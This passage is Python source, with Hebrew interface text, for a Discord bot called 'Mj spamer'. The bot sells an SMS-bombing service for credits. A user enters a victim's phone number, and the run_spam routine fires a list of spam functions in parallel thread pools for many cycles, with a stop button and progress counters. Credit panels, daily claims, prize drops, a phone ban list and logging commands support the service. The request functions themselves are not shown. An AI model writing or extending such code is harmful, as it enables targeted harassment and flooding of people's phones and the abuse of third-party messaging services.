            await interaction.response.send_message("יש להזין מספר תקין.", ephemeral=True)
            return

        # כל קרדיט = 30 שניות, כל סבב ~5 שניות => 6 סבבים לקרדיט
        total_cycles = credits_needed * 6

        user_id = str(interaction.user.id)
        
        if is_phone_banned(self.phone.value):
            await interaction.response.send_message("❌ מספר זה חסום.", ephemeral=True)
            return
        
        if not deduct_credits(user_id, credits_needed):
            current = get_credits(user_id)
            embed = discord.Embed(title="❌ אין מספיק קרדיטים",
                                  description=f"יש לך **{current}** קרדיטים, נדרשים **{credits_needed}**.",
                                  color=discord.Color.red())
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        stop_view = StopView(interaction.user.id)
        embed = discord.Embed(
            title="⏳ ספאם מתחיל...",
            description=(
                f"📱 מספר: `{self.phone.value}`\n"
                f"🔄 סיבובים: `{total_cycles}`\n"
                f"✅ הצליחו: `0`\n"
                f"❌ נכשלו: `0`\n"
                f"⏱️ נותר: `{total_cycles}` סיבובים"
            ),
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed, view=stop_view, ephemeral=True)
        msg = await interaction.original_response()
        active_spam_tasks[interaction.user.id] = False
        
        await send_spam_log(interaction, self.phone.value, credits_needed)
        
        bot.loop.create_task(run_spam(interaction, msg, self.phone.value, total_cycles, interaction.user.id))

# -------------------- כפתור עצירה --------------------
class StopView(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="⛔ עצור ספאם", style=discord.ButtonStyle.danger)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.get_role(BLOCKED_ROLE_ID):
            await interaction.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
            return
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("אין לך הרשאה לעצור ספאם זה.", ephemeral=True)
            return
        active_spam_tasks[self.user_id] = True
        button.disabled = True
        button.label = "⛔ עוצר..."
        await interaction.response.edit_message(view=self)

# -------------------- פונקציית הרצת ספאם (עם עדיפות ל-10 הראשונות) --------------------
async def run_spam(interaction: discord.Interaction, msg: discord.Message, phone: str, cycles: int, initiator_id: int):
    import time
    success_total = 0
    fail_total = 0
    start_time = time.time()

    # מפרידים את 10 הפונקציות הראשונות
    first_10 = SPAM_FUNCTIONS[:10]
    rest = SPAM_FUNCTIONS[10:]

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(SPAM_FUNCTIONS)) as executor:
        for cycle in range(1, cycles + 1):
            if active_spam_tasks.get(initiator_id, False):
                embed = discord.Embed(
                    title="⛔ ספאם נעצר",
                    description=f"📱 מספר: `{phone}`\n🔄 סיבובים שהושלמו: `{cycle - 1}/{cycles}`",
                    color=discord.Color.red()
                )
                await msg.edit(embed=embed, view=None)
                active_spam_tasks.pop(initiator_id, None)
                return

            # שולחים את 10 הפונקציות הראשונות במקביל (אותה השנייה)
            futures_first = {func.__name__: executor.submit(send_task, func, phone) for func in first_10}
            # שולחים את שאר הפונקציות במקביל גם (אבל הן עשויות להתחיל מעט אחרי)
            futures_rest = {func.__name__: executor.submit(send_task, func, phone) for func in rest}
            all_futures = {**futures_first, **futures_rest}

            for name, future in all_futures.items():
                try:
                    status, _ = future.result()
                    if status == "SUCCESS":
                        success_total += 1
                    else:
                        fail_total += 1
                except Exception:
                    fail_total += 1

            elapsed = int(time.time() - start_time)
            remaining = cycles - cycle
            embed = discord.Embed(
                title="🔄 ספאם פעיל...",
                description=(
                    f"📱 מספר: `{phone}`\n"
                    f"🔄 סיבוב: `{cycle}/{cycles}`\n"
                    f"✅ הצליחו: `{success_total}`\n"
                    f"❌ נכשלו: `{fail_total}`\n"
                    f"⏱️ נותר: `{remaining}` סיבובים\n"
                    f"🕐 זמן שעבר: `{elapsed}` שניות"
                ),
                color=discord.Color.orange()
            )
            stop_view = StopView(initiator_id)
            await msg.edit(embed=embed, view=stop_view)

    active_spam_tasks.pop(initiator_id, None)
    embed_done = discord.Embed(
        title="✅ ספאם הושלם!",
        description=f"📱 מספר: `{phone}`\n🔄 סיבובים: `{cycles}`\n🕐 זמן כולל: `{int(time.time() - start_time)}` שניות",
        color=discord.Color.green()
    )
    await msg.edit(embed=embed_done, view=None)

def send_task(func, phone):
    try:
        resp = func(phone, None)
        if 200 <= resp.status_code < 300:
            return "SUCCESS", resp.text[:100]
        return "FAILURE", f"HTTP {resp.status_code}"
    except Exception as e:
        return "ERROR", str(e)

# -------------------- פקודות סלאש --------------------
@bot.tree.command(name="smspanel", description="פתיחת פאנל ספאם (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
async def smspanel(interaction: discord.Interaction):
    await send_general_log(interaction, "smspanel", "פתח את פאנל הספאם")
    embed = discord.Embed(
        title="✨ Mj spamer ✨",
        description="לחץ על הכפתור כדי להתחיל ספאם.\n**כל קרדיט = 30 שניות ספאם (כ-6 סיבובים).**",
        color=discord.Color.blue()
    )
    view = discord.ui.View()
    button = discord.ui.Button(label="🚀 התחל ספאם", style=discord.ButtonStyle.danger)
    async def callback(inter: discord.Interaction):
        if inter.user.get_role(BLOCKED_ROLE_ID):
            await inter.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
            return
        if not inter.user.guild_permissions.administrator:
            await inter.response.send_message("❌ אין הרשאה.", ephemeral=True)
            return
        await inter.response.send_modal(SpamModal())
    button.callback = callback
    view.add_item(button)
    
    button_check = discord.ui.Button(label="💳 בדוק קרדיטים", style=discord.ButtonStyle.primary)
    async def check_callback(inter: discord.Interaction):
        if inter.user.get_role(BLOCKED_ROLE_ID):
            await inter.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
            return
        await send_general_log(inter, "smspanel_check_credits", "בדק קרדיטים בפאנל")
        user_id = str(inter.user.id)
        credits = get_credits(user_id)
        embed_check = discord.Embed(
            title="💳 הקרדיטים שלך",
            description=f"יתרה נוכחית: **{credits}** קרדיטים",
            color=discord.Color.gold()
        )
        await inter.response.send_message(embed=embed_check, ephemeral=True)
    button_check.callback = check_callback
    view.add_item(button_check)
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=False)

@bot.tree.command(name="addcredits", description="הוספת קרדיטים למשתמש (למנהלים)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
@app_commands.describe(user="המשתמש", amount="כמות להוספה")
async def addcredits(interaction: discord.Interaction, user: discord.Member, amount: int):
    if amount <= 0:
        await interaction.response.send_message("❌ חיובי בלבד.", ephemeral=True)
        return
    add_credits(str(user.id), amount)
    await send_general_log(interaction, "addcredits", f"הוסיף {amount} קרדיטים ל{user.mention}")
    embed = discord.Embed(
        title="✅ קרדיטים נוספו",
        description=f"נוספו **{amount}** קרדיטים ל{user.mention}.\nיתרה נוכחית: **{get_credits(str(user.id))}**",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="dailypanel", description="פתיחת פאנל קרדיטים יומיים (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
async def dailypanel(interaction: discord.Interaction):
    await send_general_log(interaction, "dailypanel", "פתח את פאנל הקרדיטים היומיים")
    embed = discord.Embed(
        title="🎁 פאנל קרדיטים יומיים",
        description=(
            "לחץ על הכפתור למטה כדי לקבל **5 קרדיטים** יומיים.\n"
            "ניתן לקבל פעם אחת כל **24 שעות**."
        ),
        color=discord.Color.gold()
    )
    embed.set_footer(text="כל משתמש יכול ללחוץ אחת ל-24 שעות")
    view = DailyView()
    await interaction.response.send_message(embed=embed, view=view, ephemeral=False)

class DailyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🎁 קבל 5 קרדיטים", style=discord.ButtonStyle.success, custom_id="daily_claim")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.get_role(BLOCKED_ROLE_ID):
            await interaction.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
            return
        user_id = str(interaction.user.id)
        can_claim, remaining = can_claim_daily(user_id)

        if not can_claim:
            hours = int(remaining // 3600)
            minutes = int((remaining % 3600) // 60)
            embed = discord.Embed(
                title="⏳ כבר קיבלת היום",
                description=f"תוכל לקחת שוב בעוד **{hours}ש׳ {minutes}ד׳**.",
                color=discord.Color.orange()
            )
            embed.add_field(name="💳 קרדיטים נוכחיים", value=f"`{get_credits(user_id)}`", inline=True)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        await send_general_log(interaction, "daily_claim", "קיבל קרדיטים יומיים")
        claim_daily(user_id)
        embed = discord.Embed(
            title="✅ קיבלת 5 קרדיטים!",
            description="חזור מחר לעוד 5 קרדיטים.",
            color=discord.Color.green()
        )
        embed.add_field(name="💳 יתרה נוכחית", value=f"`{get_credits(user_id)}`", inline=True)
        embed.add_field(name="⏰ הבא בעוד", value="`24 שעות`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

class CreditPanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="✅ בדוק", style=discord.ButtonStyle.primary, custom_id="credit_check")
    async def check_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.get_role(BLOCKED_ROLE_ID):
            await interaction.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
            return
        user_id = str(interaction.user.id)
        credits = get_credits(user_id)
        embed = discord.Embed(
            title="💳 הקרדיטים שלך",
            description=f"יתרה נוכחית: **{credits}** קרדיטים",
            color=discord.Color.gold()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="creditpanel", description="בדוק את כמות הקרדיטים שלך (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
async def creditpanel(interaction: discord.Interaction):
    await send_general_log(interaction, "creditpanel", "פתח את פאנל הקרדיטים")
    embed = discord.Embed(
        title="💰 פאנל קרדיטים",
        description="בדוק את כמות הקרדיטים שלך!!",
        color=discord.Color.gold()
    )
    view = CreditPanelView()
    await interaction.response.send_message(embed=embed, view=view, ephemeral=False)

@bot.tree.command(name="removecredits", description="הסרת קרדיטים מ משתמש (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
@app_commands.describe(user="המשתמש", amount="כמות להסרה")
async def removecredits(interaction: discord.Interaction, user: discord.Member, amount: int):
    if amount <= 0:
        await interaction.response.send_message("❌ חיובי בלבד.", ephemeral=True)
        return
    user_id = str(user.id)
    current = get_credits(user_id)
    if current < amount:
        embed = discord.Embed(
            title="❌ אין מספיק קרדיטים",
            description=f"{user.mention} יש לו **{current}** קרדיטים בלבד.",
            color=discord.Color.red()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    deduct_credits(user_id, amount)
    await send_general_log(interaction, "removecredits", f"הסיר {amount} קרדיטים מ{user.mention}")
    embed = discord.Embed(
        title="✅ קרדיטים הוסרו",
        description=f"הוסרו **{amount}** קרדיטים מ{user.mention}.\nיתרה נוכחית: **{get_credits(user_id)}**",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="banphone", description="חסימת מספר טלפון (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
@app_commands.describe(phonenumber="מספר הטלפון לחסימה")
async def banphone(interaction: discord.Interaction, phonenumber: str):
    if is_phone_banned(phonenumber):
        embed = discord.Embed(
            title="⚠️ מספר כבר חסום",
            description=f"המספר `{phonenumber}` כבר בחסימה.",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    ban_phone(phonenumber)
    await send_general_log(interaction, "banphone", f"חסם את הטלפון `{phonenumber}`")
    embed = discord.Embed(
        title="✅ מספר חסום",
        description=f"המספר `{phonenumber}` חסום בהצלחה.",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="unbanphone", description="שחרור מספר טלפון (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
@app_commands.describe(phonenumber="מספר הטלפון לשחרור")
async def unbanphone(interaction: discord.Interaction, phonenumber: str):
    if not is_phone_banned(phonenumber):
        embed = discord.Embed(
            title="⚠️ מספר לא חסום",
            description=f"המספר `{phonenumber}` לא בחסימה.",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    unban_phone(phonenumber)
    await send_general_log(interaction, "unbanphone", f"שחרר את הטלפון `{phonenumber}`")
    embed = discord.Embed(
        title="✅ מספר שוחרר",
        description=f"המספר `{phonenumber}` שוחרר בהצלחה.",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="checkcredits", description="בדיקת קרדיטים של משתמש")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
@app_commands.describe(user="המשתמש לבדיקה")
async def checkcredits(interaction: discord.Interaction, user: discord.Member):
    await send_general_log(interaction, "checkcredits", f"בדק את הקרדיטים של {user.mention}")
    credits = get_credits(str(user.id))
    embed = discord.Embed(
        title="💳 בדיקת קרדיטים",
        description=f"**{user.mention}** יש **{credits}** קרדיטים",
        color=discord.Color.gold()
    )
    await interaction.response.send_message(embed=embed, ephemeral=False)

@bot.tree.command(name="smslogs", description="הגדר ערוץ ללוגים של ספאם (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
@app_commands.describe(channel="הערוץ ללוגים")
async def smslogs(interaction: discord.Interaction, channel: discord.TextChannel):
    guild_id = str(interaction.guild.id)
    channel_id = str(channel.id)
    set_log_channel(guild_id, channel_id)
    await send_general_log(interaction, "smslogs", f"הגדיר את ערוץ הלוגים ל{channel.mention}")
    embed = discord.Embed(
        title="✅ ערוץ לוגים הוגדר",
        description=f"כל הלוגים של הספאם יישלחו ל{channel.mention}",
        color=discord.Color.green()
    )
    embed.add_field(name="📌 ערוץ", value=f"`{channel.name}`", inline=True)
    embed.add_field(name="🆔 ID", value=f"`{channel_id}`", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)

# -------------------- Drop (הגרלה) --------------------
class DropView(discord.ui.View):
    def __init__(self, drop_id: str, winners: int, credits: int, channel_id: int):
        super().__init__(timeout=None)
        self.drop_id = drop_id
        self.winners = winners
        self.credits = credits
        self.channel_id = channel_id
        self.has_ended = False

    @discord.ui.button(label="🎁 קח", style=discord.ButtonStyle.success, custom_id="drop_claim")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.get_role(BLOCKED_ROLE_ID):
            await interaction.response.send_message("❌ אתה בחסימה כרגע....", ephemeral=True)
            return

        # בדיקה אם הדרופ כבר הסתיים (אין זוכים שנותרו)
        drop_status = get_drop_status(self.drop_id)
        if not drop_status or drop_status["winners_left"] <= 0:
            # משביתים את הכפתור ומעדכנים את ההודעה (ללא הודעה נוספת)
            button.disabled = True
            button.label = "❌ הסתיים"
            await interaction.response.edit_message(view=self)
            return

        user_id = str(interaction.user.id)
        success, credits_won = claim_drop(self.drop_id, user_id)

        if not success:
            await interaction.response.send_message("❌ אתה כבר זכית או שהפרס נגמר.", ephemeral=True)
            return

        add_credits(user_id, credits_won)

        drop_status = get_drop_status(self.drop_id)
        winners_left = drop_status["winners_left"] if drop_status else 0

        embed = discord.Embed(
            title="🎉 הזכת!",
            description=f"קיבלת **{credits_won}** קרדיטים!",
            color=discord.Color.gold()
        )
        embed.add_field(name="💳 קרדיטים כוללים", value=f"`{get_credits(user_id)}`", inline=True)
        embed.add_field(name="🎁 זוכים שנותרו", value=f"`{winners_left}`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

        # אם נגמרו הזוכים – שולחים פאנל סיכום ומשביתים את הכפתור
        if winners_left <= 0 and not self.has_ended:
            self.has_ended = True
            winners = get_drop_winners(self.drop_id)
            channel = bot.get_channel(self.channel_id)
            if channel:
                embed_summary = discord.Embed(
                    title="🏆 הדרופ הסתיים!",
                    description=f"**{len(winners)}** זוכים זכו ב-**{self.credits}** קרדיטים כל אחד.",
                    color=discord.Color.gold()
                )
                # עיצוב רשימת הזוכים עם אימוג'ים
                winner_list = "\n".join([f"👤 <@{w[0]}> – **{w[1]}** קרדיטים" for w in winners])
                embed_summary.add_field(name="📋 רשימת הזוכים", value=winner_list, inline=False)
                embed_summary.set_footer(text="מזל טוב לכולם! 🎊")
                await channel.send(embed=embed_summary)

            # משביתים את הכפתור בהודעה המקורית
            button.disabled = True
            button.label = "❌ הסתיים"
            await interaction.edit_original_response(view=self)

@bot.tree.command(name="drop", description="הפיל קרדיטים לזוכים (למנהלים בלבד)")
@has_role_or_is_allowed_user()
@app_commands.check(is_not_blocked)
@app_commands.describe(amountcredits="כמה קרדיטים לכל זוכה", how_much_winners="כמה זוכים יכולים לקחת")
async def drop_command(interaction: discord.Interaction, amountcredits: int, how_much_winners: int):
    if amountcredits <= 0 or how_much_winners <= 0:
        await interaction.response.send_message("❌ כל הערכים חייבים להיות חיוביים.", ephemeral=True)
        return

    drop_id = f"drop_{interaction.guild.id}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
    create_drop(drop_id, how_much_winners, amountcredits)
    await send_general_log(interaction, "drop", f"הפיל {how_much_winners} קרדיטים ({amountcredits} לכל זוכה)")

    embed = discord.Embed(
        title="🎁 פרס מחכה!",
        description=f"לחץ על הכפתור לזכות ב-**{amountcredits}** קרדיטים! (רק {how_much_winners} זוכים)",
        color=discord.Color.gold()
    )
    embed.add_field(name="💰 קרדיטים לזוכה", value=f"`{amountcredits}`", inline=True)
    embed.add_field(name="👥 זוכים זמינים", value=f"`{how_much_winners}`", inline=True)
    embed.set_footer(text="הראשונים שלוקחים זוכים!")

    view = DropView(drop_id, how_much_winners, amountcredits, interaction.channel.id)
    await interaction.response.send_message(embed=embed, view=view, ephemeral=False)

# -------------------- Help --------------------
@bot.tree.command(name="help", description="הצג את כל הפקודות הזמינות") @has_role_or_is_allowed_user()
async def help_command(interaction: discord.Interaction):
    is_admin = interaction.user.guild_permissions.administrator
    is_blocked = interaction.user.get_role(BLOCKED_ROLE_ID) is not None

    embed = discord.Embed(
        title="📚 עזרה - כל הפקודות",
        description="הנה רשימה של כל הפקודות הזמינות ותיאור שלהן",
        color=discord.Color.blurple()
    )

    status = "✅ יש גישה" if (is_admin and not is_blocked) else "❌ אין גישה"
    embed.add_field(name="📱 /smspanel", value=f"פתיחת פאנל ספאם\n{status}", inline=False)
    embed.add_field(name="💳 /addcredits", value=f"הוספת קרדיטים למשתמש\n{status}", inline=False)
    embed.add_field(name="➖ /removecredits", value=f"הסרת קרדיטים ממשתמש\n{status}", inline=False)
    embed.add_field(name="🎁 /dailypanel", value=f"פאנל קרדיטים יומיים\n{status}", inline=False)
    embed.add_field(name="💰 /creditpanel", value=f"בדיקת הקרדיטים שלך\n{status}", inline=False)
    embed.add_field(name="🔍 /checkcredits", value=f"בדיקת קרדיטים של משתמש אחר\n{status}", inline=False)
    embed.add_field(name="🚫 /banphone", value=f"חסימת מספר טלפון\n{status}", inline=False)
    embed.add_field(name="✅ /unbanphone", value=f"שחרור מספר טלפון\n{status}", inline=False)
    embed.add_field(name="📋 /smslogs", value=f"הגדרת ערוץ ללוגים\n{status}", inline=False)
    embed.add_field(name="🎁 /drop", value=f"הפיל קרדיטים לזוכים\n{status}", inline=False)

    embed.set_footer(text="⚠️ רק אדמינים יכולים להשתמש בפקודות. משתמשים בחסימה לא יכולים להשתמש באף פקודה.")
    await interaction.response.send_message(embed=embed, ephemeral=False)

# -------------------- טיפול בשגיאות --------------------
@smspanel.error
async def smspanel_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@addcredits.error
async def addcredits_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@dailypanel.error
async def dailypanel_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@creditpanel.error
async def creditpanel_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@removecredits.error
async def removecredits_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@banphone.error
async def banphone_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@unbanphone.error
async def unbanphone_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@checkcredits.error
async def checkcredits_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@smslogs.error
async def smslogs_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

@drop_command.error
async def drop_command_error(interaction, error):
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("❌ למנהלים בלבד.", ephemeral=True)

# -------------------- הרצה --------------------
@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f'Bot {bot.user} מוכן!')

if __name__ == "__main__":
    if not TOKEN:
        print("❌ לא נמצא טוקן ב-config.json")
    else:
        bot.run(TOKEN)

